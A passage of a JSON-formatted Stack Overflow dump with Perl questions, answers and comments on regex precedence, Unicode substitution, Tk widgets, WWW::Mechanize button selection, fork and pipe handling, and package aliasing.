"https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457415145, "post_id": 35837616, "comment_id": 59384210, "body": "If you want a formal document, you can look at file:///home/XML/XML%20Schema%20Part%202 %3A%20Datatypes%20Second%20Edition.html#regexs which isn&#39;t Perl but it defines the syntactic basics valid for all regex languages."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 5, "last_activity_date": 1457370532, "last_edit_date": 1457370532, "creation_date": 1457363304, "answer_id": 35847113, "question_id": 35837616, "link": "https://stackoverflow.com/questions/35837616/what-are-the-precedence-rules-for-perl-regular-expressions/35847113#35847113", "title": "What are the precedence rules for Perl regular expressions?", "body": "<p>Regular expressions only have two binary operators, one of which is implicit rather than represented by a symbol. Regular expressions also have a number of unary operators, but their precedence is moot due to the restrictions on their operands. That makes talking about precedence really odd.</p>\n\n<p>It's simpler conveying the information you seek using the following statements:</p>\n\n<ul>\n<li>Quantifiers modify a single atom.</li>\n<li>Quantifiers modifiers modify a single quantifier.</li>\n<li>Alternation is unbounded except by the parens in which they reside.</li>\n</ul>\n\n<p>The above information is conveyed one way or another in <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow\">perlretut</a>.</p>\n\n<hr>\n\n<p>That said, it is possible to build a precedence table. Since the above statements convey all the information you need, it's possible to build the precedence table from them. It is the following:</p>\n\n<ol>\n<li>Atoms (e.g. <code>a</code>, <code>\\n</code>, <code>\\^</code>, <code>.</code>, <code>^</code>, <code>\\w</code>, <code>[...]</code>, <code>\\1</code>, <code>(...)</code>)</li>\n<li>Postfix unary operators (quantifiers and quantifier modifiers)</li>\n<li>Implicit \"followed by\" operator between (possibly-quantified) atoms</li>\n<li>Alternation </li>\n</ol>\n\n<p>This matches the chart in the page to which you linked.</p>\n\n<hr>\n\n<p>For fun, the following would be the BNF:</p>\n\n<pre><code>pattern              ::= &lt;alternation&gt;\n\nalternation          ::= &lt;sequence&gt; &lt;alternation2&gt;\nalternation2         ::= \"|\" &lt;alternation&gt; | \"\"\n\nsequence             ::= &lt;quantified_atom&gt; &lt;sequence&gt; | \"\"\n\nquantified_atom      ::= &lt;atom&gt; &lt;quantified_atom2&gt;\nquantified_atom2     ::= &lt;modified_quantifier&gt; | \"\"\nmodified_quantifier  ::= &lt;quantifier&gt; &lt;modified_quantifier2&gt;\nmodified_quantifier2 ::= &lt;quantifier_modifier&gt; | \"\"\n</code></pre>\n"}], "owner": {"reputation": 5403, "user_id": 431698, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/59b288f9d5793f1c114f30837ae0ec44?s=128&d=identicon&r=PG", "display_name": "Jingguo Yao", "link": "https://stackoverflow.com/users/431698/jingguo-yao"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 436, "favorite_count": 0, "answer_count": 1, "score": 5, "last_activity_date": 1457370532, "creation_date": 1457332649, "question_id": 35837616, "link": "https://stackoverflow.com/questions/35837616/what-are-the-precedence-rules-for-perl-regular-expressions", "title": "What are the precedence rules for Perl regular expressions?", "body": "<p>I can find't an official reference for the precedence rules for <a href=\"http://perldoc.perl.org/perlre.html\">Perl regular expressions</a>. What I can find is only <a href=\"http://codeidol.com/community/perl/know-the-precedence-of-regular-expression-operator/14215/\">Know the precedence of regular expression operators</a>. However, it's not an official reference given by <a href=\"http://perldoc.perl.org/\">perldoc</a>.</p>\n"}, {"tags": ["arrays", "perl", "loops"], "comments": [{"owner": {"reputation": 13971, "user_id": 554807, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/11449ff391eb9e813ac9f467ae6e0102?s=128&d=identicon&r=PG", "display_name": "GreenAsJade", "link": "https://stackoverflow.com/users/554807/greenasjade"}, "edited": false, "score": 2, "creation_date": 1457331819, "post_id": 35837352, "comment_id": 59341170, "body": "Welcome to Stack Overflow.  Please review <a href=\"https://stackoverflow.com/help\">help center</a> about how to ask questions here."}], "answers": [{"comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457333067, "post_id": 35837584, "comment_id": 59341607, "body": "The question is completely unclear, and should not be answered in its current state. See <a href=\"https://stackoverflow.com/questions/how-to-answer\">How to Answer</a> for more information."}, {"owner": {"reputation": 244, "user_id": 1148844, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tKczz.jpg?s=128&g=1", "display_name": "SArcher", "link": "https://stackoverflow.com/users/1148844/sarcher"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457333151, "post_id": 35837584, "comment_id": 59341641, "body": "Eh, no, it&#39;s pretty clear. Not the best writing, but still easy to understand."}], "tags": [], "owner": {"reputation": 244, "user_id": 1148844, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tKczz.jpg?s=128&g=1", "display_name": "SArcher", "link": "https://stackoverflow.com/users/1148844/sarcher"}, "is_accepted": false, "score": -1, "last_activity_date": 1457332505, "creation_date": 1457332505, "answer_id": 35837584, "question_id": 35837352, "link": "https://stackoverflow.com/questions/35837352/how-to-generate-a-new-array-in-perl-each-time-a-loop-runs/35837584#35837584", "title": "how to generate a new array in perl each time a loop runs", "body": "<p>What you want is an array of arrays, i.e. a multi-dimensional array. </p>\n\n<pre><code>my @arrays;\nfor my $i(0..10)\n{\n    $arrays[$i] = ['data1', 'data2'];\n}\n\nprint $arrays[0][0];\nprint $arrays[0][1];\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5446998, "user_type": "registered", "profile_image": "https://graph.facebook.com/1058990494119904/picture?type=large", "display_name": "Mohit Malik", "link": "https://stackoverflow.com/users/5446998/mohit-malik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "closed_date": 1457345743, "answer_count": 1, "score": -3, "last_activity_date": 1457336001, "creation_date": 1457331465, "question_id": 35837352, "link": "https://stackoverflow.com/questions/35837352/how-to-generate-a-new-array-in-perl-each-time-a-loop-runs", "closed_reason": "Duplicate", "title": "how to generate a new array in perl each time a loop runs", "body": "<p>I am running a loop and each time i need to store some information in a new array. How to generate a new array each time the loop runs like @array1, @array2 , @array3 and so on?</p>\n"}, {"tags": ["perl", "proxy"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user6024347"}, "edited": false, "score": 0, "creation_date": 1457523005, "post_id": 35873191, "comment_id": 59441541, "body": "can i like set proxy to core perl script(I want to run every perl script via proxy(The script which does not even have http connections))"}], "tags": [], "owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "is_accepted": false, "score": 0, "last_activity_date": 1457455787, "creation_date": 1457455787, "answer_id": 35873191, "question_id": 35837022, "link": "https://stackoverflow.com/questions/35837022/perl-how-to-add-proxy-to-my-script/35873191#35873191", "title": "perl how to add proxy to my script", "body": "<p><code>Mail::VRFY</code> <a href=\"https://metacpan.org/source/JKISTER/Mail-VRFY-1.01/VRFY.pm\" rel=\"nofollow\">uses DNS and SMTP</a> to verify email addresses. I guess that by \"proxy address\" you mean an HTTP proxy. This kind of proxy server won't help you, since no HTTP connections are involved.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6024347"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 117, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457455787, "creation_date": 1457329822, "question_id": 35837022, "link": "https://stackoverflow.com/questions/35837022/perl-how-to-add-proxy-to-my-script", "title": "perl how to add proxy to my script", "body": "<p>I want add proxy to my script which is interacting with networks(Mainly i want to hide my ip for outgoing request)</p>\n\n<p>How to use it with this script?</p>\n\n<pre><code>use CGI qw/:standard/;\nuse Mail::VRFY;\nuse Mail::Verify;\nuse HTTP::Daemon;\nmy $emailaddress = $ARGV[0];\nmy $d = HTTP::Daemon-&gt;new( \nLocalHost =&gt; \"localhost\",  # remove this to listen from other machines \n               # (i.e. open-relay... be careful of spammers!)\nLocalPort =&gt; 8080\n) || die;\nprint \"[Proxy URL:\", $d-&gt;url, \"]\\n\";\n#print $email_ck;\nmy $code = Mail::VRFY::CheckAddress(addr =&gt; $emailaddress,method  =&gt; 'extended',timeout =&gt; 12,debug   =&gt; 0);\nprint $code;\n</code></pre>\n\n<p>I have a proxy address</p>\n\n<p>Now how to add it to outgoing request for eg i have to use proxy with this function</p>\n\n<pre><code>my $code = Mail::VRFY::CheckAddress(addr =&gt; $emailaddress,method  =&gt; 'extended',timeout =&gt; 12,debug   =&gt; 0);\n</code></pre>\n\n<p>How to do it?</p>\n"}, {"tags": ["perl", "unicode"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 2, "creation_date": 1457327836, "post_id": 35836195, "comment_id": 59339880, "body": "Check the encoding of your input. If it is UTF-8 encoded, for example, the em-dash will match <code>\\x{e2}\\x{80}\\x{94}</code>."}, {"owner": {"reputation": 2531, "user_id": 1067305, "user_type": "registered", "accept_rate": 31, "profile_image": "https://www.gravatar.com/avatar/d0d62c9f798697f2c32f86d66f5e4a86?s=128&d=identicon&r=PG", "display_name": "user1067305", "link": "https://stackoverflow.com/users/1067305/user1067305"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1457334743, "post_id": 35836195, "comment_id": 59342291, "body": "Good! That works in the call to index, but not in the regex. But that&#39;ll get the job done. It&#39;s a pity that the documentation doesn&#39;t say anything about having to break up the hex into 3 separate characters."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1457365504, "post_id": 35836195, "comment_id": 59361322, "body": "<code>$line =~ s&#47;\\x{2014}&#47;--&#47;g;</code> does work, which means that <code>$line</code> doesn&#39;t contain an em dash. Maybe it contains the UTF-8 encoding of an em dash? Decode inputs, and encode outputs!"}], "answers": [{"tags": [], "owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "is_accepted": false, "score": 0, "last_activity_date": 1457325625, "creation_date": 1457325625, "answer_id": 35836278, "question_id": 35836195, "link": "https://stackoverflow.com/questions/35836195/in-a-perl-string-how-can-i-replace-a-unicode-em-dash-with-2-ascii-hyphens/35836278#35836278", "title": "In a perl string, how can I replace a unicode em dash with 2 ascii hyphens?", "body": "<p>Works for me:</p>\n\n<pre><code>#!/bin/perl -w\n\nuse feature 'unicode_strings';\nuse utf8;\n\n$line = \"first \u2014 and second\";\n$line =~ s/\\x{2014}/--/g;\nprint(\"$line\\n\");\n# =&gt; first -- and second\n</code></pre>\n"}], "owner": {"reputation": 2531, "user_id": 1067305, "user_type": "registered", "accept_rate": 31, "profile_image": "https://www.gravatar.com/avatar/d0d62c9f798697f2c32f86d66f5e4a86?s=128&d=identicon&r=PG", "display_name": "user1067305", "link": "https://stackoverflow.com/users/1067305/user1067305"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1103, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1457325625, "creation_date": 1457324988, "question_id": 35836195, "link": "https://stackoverflow.com/questions/35836195/in-a-perl-string-how-can-i-replace-a-unicode-em-dash-with-2-ascii-hyphens", "title": "In a perl string, how can I replace a unicode em dash with 2 ascii hyphens?", "body": "<p>I first just tried to find it in a line using:</p>\n\n<pre><code>    $w = index($line, \"\\x{2014}\");\n</code></pre>\n\n<p>I got no syntax error, but $w was never >= 0.</p>\n\n<p>I tried:</p>\n\n<pre><code>    $line =~ s/\\x{2014}/--/g;\n</code></pre>\n\n<p>and that didn't work either, ie: no changes were made.</p>\n\n<p>What's the simplest way to make the swap?</p>\n\n<p>If this was explained in prior posts, I didn't see where.</p>\n"}, {"tags": ["perl", "tk", "perl-module"], "answers": [{"tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": true, "score": 1, "last_activity_date": 1457594184, "creation_date": 1457594184, "answer_id": 35909959, "question_id": 35835646, "link": "https://stackoverflow.com/questions/35835646/perl-fileselect-omit-unused-buttons/35909959#35909959", "title": "Perl FileSelect omit unused buttons", "body": "<p><code>Reset</code> and <code>Home</code> buttons are not configurable in <code>Tk::FileSelect</code>.</p>\n\n<p>If you really want this you can either patch the lib, or you can try to remove the buttons after <code>FileSelect</code> have created them. Neither solution being recommended.</p>\n"}], "owner": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 35909959, "answer_count": 1, "score": 1, "last_activity_date": 1457594184, "creation_date": 1457320921, "last_edit_date": 1457326857, "question_id": 35835646, "link": "https://stackoverflow.com/questions/35835646/perl-fileselect-omit-unused-buttons", "title": "Perl FileSelect omit unused buttons", "body": "<p>I am using the module <code>Tk::FileSelect</code> for file selection for processing. Below is the code I use to generate a FileSelect window</p>\n\n<pre><code>my $win = MainWindow-&gt;new()-&gt;FileSelect();\n$win-&gt;Show;\n</code></pre>\n\n<p>And here is the window produced:</p>\n\n<p><a href=\"https://i.stack.imgur.com/M6yAt.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/M6yAt.png\" alt=\"enter image description here\"></a></p>\n\n<p>I think this window looks great, but there are two buttons that I would never need to use - the <code>Reset</code> and <code>Home</code> buttons so I want to remove them from the displayed window. I have looked at this <a href=\"http://mkweb.bcgsc.ca/intranet/perlbook/tk/appb_13.htm\" rel=\"nofollow noreferrer\">link</a> for list of configuration options but can't seem to find one to do this. Any help would be appreciated!</p>\n"}, {"tags": ["perl", "www-mechanize"], "answers": [{"comments": [{"owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457444265, "post_id": 35833124, "comment_id": 59401550, "body": "hello ,  $input just returns me number of buttons belong to this class .  When I print it , it displays 1"}, {"owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457711501, "post_id": 35833124, "comment_id": 59545450, "body": "I apologize to ask question again , but in the website , the button always change the position , so sometimes I click the right button , but sometimes the wrong one , I tried $mech-&gt;find_all_submits(value =&gt; &#39;CLICK HERE&#39;))[0]; too , but did not work."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457711702, "post_id": 35833124, "comment_id": 59545602, "body": "What do you mean by &quot;did not work&quot;? Are the other buttons also <code>submit good</code> classified?"}, {"owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457711843, "post_id": 35833124, "comment_id": 59545723, "body": "I have this &lt;input class=&quot;submit good&quot; name=&quot;R_HCWE&quot; value=&quot;CLICK HERE&quot; type=&quot;submit&quot;&gt;   , and this &lt;input class=&quot;submit bad&quot; name=&quot;R_ACWE&quot; value=&quot;DO NOT CLICK HERE&quot; type=&quot;submit&quot;&gt; , did not work means my script clicks one of these two buttons just randomly , because the position of the buttons always changes , and it clicks the first one."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457712996, "post_id": 35833124, "comment_id": 59546478, "body": "@ccca: How can it return all the inputs when you specify the class?"}, {"owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457714092, "post_id": 35833124, "comment_id": 59547274, "body": "I did not get what I am doing wrong , is it possible to read the text that the button has?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 1, "creation_date": 1457715550, "post_id": 35833124, "comment_id": 59548219, "body": "@ccca: I updated the post with a standalone example that works. You can switch the buttons and it would still work."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 4, "last_activity_date": 1457715469, "last_edit_date": 1457715469, "creation_date": 1457301616, "answer_id": 35833124, "question_id": 35832994, "link": "https://stackoverflow.com/questions/35832994/how-to-click-a-button-with-its-value-with-wwwmechanize/35833124#35833124", "title": "How to click a button with its value with WWW::Mechanize", "body": "<p>Use the <code>find_all_submits</code> method to find the button, then click it:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nuse WWW::Mechanize;\n\nmy $mech = 'WWW::Mechanize'-&gt;new;\n$mech-&gt;get('http://search.cpan.org/perldoc/WWW::Mechanize');\n$mech-&gt;update_html(&lt;&lt; '__HTML__');\n\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=\"/1.pl\"&gt;\n&lt;input class=\"submit bad\" name=\"R_ACWE\" value=\"DO NOT CLICK HERE\" type=\"submit\"&gt;\n&lt;input class=\"submit good\" name=\"R_HCWE\" value=\"CLICK HERE\" type=\"submit\"&gt;\n&lt;form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n__HTML__\n\nmy $button = ($mech-&gt;find_all_submits(class =&gt; 'submit good'))[0];\nsay $button-&gt;class;\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 937, "favorite_count": 2, "accepted_answer_id": 35833124, "answer_count": 1, "score": 2, "last_activity_date": 1457715469, "creation_date": 1457300740, "last_edit_date": 1457301691, "question_id": 35832994, "link": "https://stackoverflow.com/questions/35832994/how-to-click-a-button-with-its-value-with-wwwmechanize", "title": "How to click a button with its value with WWW::Mechanize", "body": "<p>I am trying to click a button using a Perl script with the Mechanize module. However, the name and the position of the button always changes, so I want to click it by using its value, but I could not find how to do it. </p>\n\n<p>The button is like this:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;input class=\"submit good\" name=\"R_HCWE\" value=\"CLICK HERE\" type=\"submit\"&gt;\n</code></pre>\n\n<p>I cannot use simply the <code>submit()</code> method, because there is another button to submit the form that belongs to class \"submit bad\".</p>\n"}, {"tags": ["perl", "io"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457309207, "post_id": 35832743, "comment_id": 59335349, "body": "Does this <i>always</i> happen when detached?  Does STDOUT get redirected earlier -- on the cron-ed command line, or in the program?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457338599, "post_id": 35832743, "comment_id": 59344114, "body": "I cannot see the problem, for me it works either way. I updated my post with specific things I&#39;d try, and with exact code I am using.  I am thinking of the buffering/STDIN getting messed up. For example, the last prints (last buffer) don&#39;t get flushed."}], "answers": [{"tags": [], "owner": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "is_accepted": true, "score": 0, "last_activity_date": 1457446029, "creation_date": 1457446029, "answer_id": 35869558, "question_id": 35832743, "link": "https://stackoverflow.com/questions/35832743/perl-parent-process-hangs-waiting-for-child-process-to-read-stdin/35869558#35869558", "title": "perl parent process hangs waiting for child process to read stdin", "body": "<p>Well, after some experimentation it seems that opening <code>STDOUT</code> directly appears to be at least part of the reason. My code now reads like this:</p>\n\n<pre><code>$pid = open($handle, '|-');\nif ($pid == 0)\n{\n    # Child. \n    # Open log file\n    while (&lt;STDIN&gt;)\n    {\n       # print to STDOUT and log file\n    }\n    #close log files\n    exit;\n}\n# parent\nopen my $oldout, '&gt;&amp;STDOUT';\nopen my $olderr, '&gt;&amp;STDERR';\nopen STDOUT, '&gt;&amp;', $handle;\nopen STDERR, '&gt;&amp;', $handle;\n# do lots of system(\"...\") calls\nopen STDOUT, '&gt;&amp;', $oldout;\nopen STDERR, '&gt;&amp;', $olderr;\nclose $handle or die \"Log child exited unexpectedly: $!\\n\";\nexit;\n</code></pre>\n\n<p>which if nothing else, looks cleaner (but still messier than I'd like as I don't know what to do if any of those dups has an error). But I'm still unclear as to why opening and closing a handle much earlier in the code made such a difference to this bit.</p>\n"}], "owner": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 899, "favorite_count": 1, "accepted_answer_id": 35869558, "answer_count": 1, "score": 2, "last_activity_date": 1457446029, "creation_date": 1457299266, "last_edit_date": 1457303661, "question_id": 35832743, "link": "https://stackoverflow.com/questions/35832743/perl-parent-process-hangs-waiting-for-child-process-to-read-stdin", "title": "perl parent process hangs waiting for child process to read stdin", "body": "<p>I have a perl script which emulates a tee command so I can get output written to the terminal and a log file. It works something like this (error checking &amp;c omitted).</p>\n\n<pre><code>$pid = open(STDOUT, '-|');\n# Above is perl magic that forks a process and sets up a pipe with the\n# child's STDIN being one end of the pipe and the parent's STDOUT (in\n# this case) being the other.\nif ($pid == 0)\n{\n    # Child. \n    # Open log file\n    while (&lt;STDIN&gt;)\n    {\n       # print to STDOUT and log file\n    }\n    #close log files\n    exit;\n}\n# parent\nopen STDERR, '&gt;&amp;STDOUT';\n# do lots of system(\"...\") calls\nclose STDERR;\nclose STDOUT;\nexit;\n</code></pre>\n\n<p>This sometimes hangs, and invariably if you look at the processes and the stacks of said processes, the parent is hanging in one of the closes, waiting for the child to exit, whereas the child is hanging reading something from a file (which has to be STDIN, because there's no other file).</p>\n\n<p>I'm rather at a loss as to how to deal with this. The problem seems to happen if you are running the program from a shell that isn't attached to a console - running the script in a normal shell works fine - and the only piece of code that has changed recently in that script is the addition of an open/close of a file just to touch it (and it's before the script gets to this 'tee' code).</p>\n\n<p>Has anybody had problems like this before and/or have a suggestion as to what I can do to fix this? Thanks.</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 1, "last_activity_date": 1457292949, "creation_date": 1457292949, "answer_id": 35831544, "question_id": 35831183, "link": "https://stackoverflow.com/questions/35831183/dealing-with-deep-package-names-in-perl-and-their-exported-constants-and-subrout/35831544#35831544", "title": "Dealing with deep package names in perl and their exported constants and subroutines", "body": "<p>You could use <a href=\"https://metacpan.org/pod/Module::Load\" rel=\"nofollow\">Module::Load</a> like this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Module::Load qw(load_remote);\nBEGIN {\n    load_remote 'ThirdPackage', 'Vendor::FirstPackage::SecondPackage::ThirdPackage', qw(const_a);\n}\n\nmy $x = ThirdPackage::const_a;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "is_accepted": false, "score": 3, "last_activity_date": 1457292968, "creation_date": 1457292968, "answer_id": 35831550, "question_id": 35831183, "link": "https://stackoverflow.com/questions/35831183/dealing-with-deep-package-names-in-perl-and-their-exported-constants-and-subrout/35831550#35831550", "title": "Dealing with deep package names in perl and their exported constants and subroutines", "body": "<p>You can create a package like this in your main script:</p>\n\n<pre><code>package ThirdPackage;\nuse strict;\nuse Vendor::FirstPackage::SecondPackage::ThirdPackage qw(const_a);\n</code></pre>\n\n<p>Then you should be able to access <code>const_a</code> as <code>ThirdPackage::const_a</code>. If you will put that package at the beginning of your main script, then main code should be separated with <code>package main;</code></p>\n"}, {"comments": [{"owner": {"reputation": 713, "user_id": 1164030, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/jTP9g.png?s=128&g=1", "display_name": "gogators", "link": "https://stackoverflow.com/users/1164030/gogators"}, "edited": false, "score": 0, "creation_date": 1457353215, "post_id": 35831555, "comment_id": 59352531, "body": "Other than style, is there a functional reason for using the FQN instead of an alias?"}, {"owner": {"reputation": 87649, 